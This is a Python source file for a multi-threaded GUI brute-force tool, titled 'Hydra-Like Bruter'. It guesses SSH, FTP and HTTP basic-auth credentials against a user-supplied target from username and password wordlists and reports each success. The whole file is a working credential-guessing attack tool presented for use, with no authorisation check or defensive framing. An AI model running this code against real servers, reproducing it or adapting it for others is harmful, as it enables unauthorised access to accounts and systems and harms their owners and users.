import paramiko
import ftplib
import requests
import threading
import queue
import tkinter as tk
from tkinter import filedialog, scrolledtext, ttk, messagebox
import os

# Thread-safe queue for tasks
task_queue = queue.Queue()

# --- Service brute force functions ---

def ssh_login(ip, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password, timeout=3)
        client.close()
        return True
    except:
        return False

def ftp_login(ip, username, password):
    try:
        ftp = ftplib.FTP(ip, timeout=5)
        ftp.login(user=username, passwd=password)
        ftp.quit()
        return True
    except:
        return False

def http_basic_auth_login(url, username, password):
    try:
        response = requests.get(url, auth=(username, password), timeout=5)
        return response.status_code == 200
    except:
        return False

# --- Worker thread ---

def worker(protocol, target, url, log_func):
    while not task_queue.empty():
        try:
            username, password = task_queue.get_nowait()
        except queue.Empty:
            return

        success = False
        if protocol == "ssh":
            success = ssh_login(target, username, password)
        elif protocol == "ftp":
            success = ftp_login(target, username, password)
        elif protocol == "http":
            success = http_basic_auth_login(url, username, password)

        if success:
            log_func(f"[+] SUCCESS: {username}:{password}")
            with task_queue.mutex:
                task_queue.queue.clear()
            return
        else:
            log_func(f"[-] Failed: {username}:{password}")

# --- GUI Class ---

class BruteForceGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Hydra-Like Bruter by khanshorif57")
        self.root.geometry("700x500")
        self.protocol = tk.StringVar(value="ssh")
        self.target = tk.StringVar()
        self.url = tk.StringVar()
        self.userlist = tk.StringVar()
        self.passlist = tk.StringVar()
        self.threads = tk.IntVar(value=5)

        self.build_gui()

    def build_gui(self):
        frame = tk.Frame(self.root)
        frame.pack(pady=10)

        tk.Label(frame, text="Protocol:").grid(row=0, column=0, sticky="e")
        protocol_menu = ttk.Combobox(frame, textvariable=self.protocol, values=["ssh", "ftp", "http"], state="readonly")
        protocol_menu.grid(row=0, column=1)

        tk.Label(frame, text="Target IP/Domain:").grid(row=1, column=0, sticky="e")
        tk.Entry(frame, textvariable=self.target, width=30).grid(row=1, column=1)

        tk.Label(frame, text="(For HTTP) URL:").grid(row=2, column=0, sticky="e")
        tk.Entry(frame, textvariable=self.url, width=30).grid(row=2, column=1)

        tk.Label(frame, text="Userlist File:").grid(row=3, column=0, sticky="e")
        tk.Entry(frame, textvariable=self.userlist, width=30).grid(row=3, column=1)
        tk.Button(frame, text="Browse", command=self.browse_userlist).grid(row=3, column=2)

        tk.Label(frame, text="Passlist File:").grid(row=4, column=0, sticky="e")
        tk.Entry(frame, textvariable=self.passlist, width=30).grid(row=4, column=1)
        tk.Button(frame, text="Browse", command=self.browse_passlist).grid(row=4, column=2)

        tk.Label(frame, text="Threads:").grid(row=5, column=0, sticky="e")
        tk.Entry(frame, textvariable=self.threads, width=5).grid(row=5, column=1, sticky="w")

        tk.Button(self.root, text="Start Attack", command=self.start_attack).pack(pady=10)

        self.output = scrolledtext.ScrolledText(self.root, width=80, height=15)
        self.output.pack(pady=10)

    def log(self, message):
        self.output.insert(tk.END, message + "\n")
        self.output.see(tk.END)
        self.root.update()

    def browse_userlist(self):
        path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if path:
            self.userlist.set(path)

    def browse_passlist(self):
        path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if path:
            self.passlist.set(path)

    def start_attack(self):
        if not (self.target.get() and self.userlist.get() and self.passlist.get()):
            messagebox.showerror("Error", "Please fill all required fields.")
            return

        self.output.delete(1.0, tk.END)
        self.log("[*] Starting attack...")

        # Load wordlists
        try:
            usernames = [line.strip() for line in open(self.userlist.get())]
            passwords = [line.strip() for line in open(self.passlist.get())]
        except Exception as e:
            messagebox.showerror("Error", f"File error: {str(e)}")
            return

        for user in usernames:
            for pw in passwords:
                task_queue.put((user, pw))

        # Launch worker threads
        for _ in range(self.threads.get()):
            t = threading.Thread(target=worker, args=(self.protocol.get(), self.target.get(), self.url.get(), self.log))
            t.start()

# --- Main Execution ---

if __name__ == "__main__":
    root = tk.Tk()
    app = BruteForceGUI(root)
    root.mainloop()
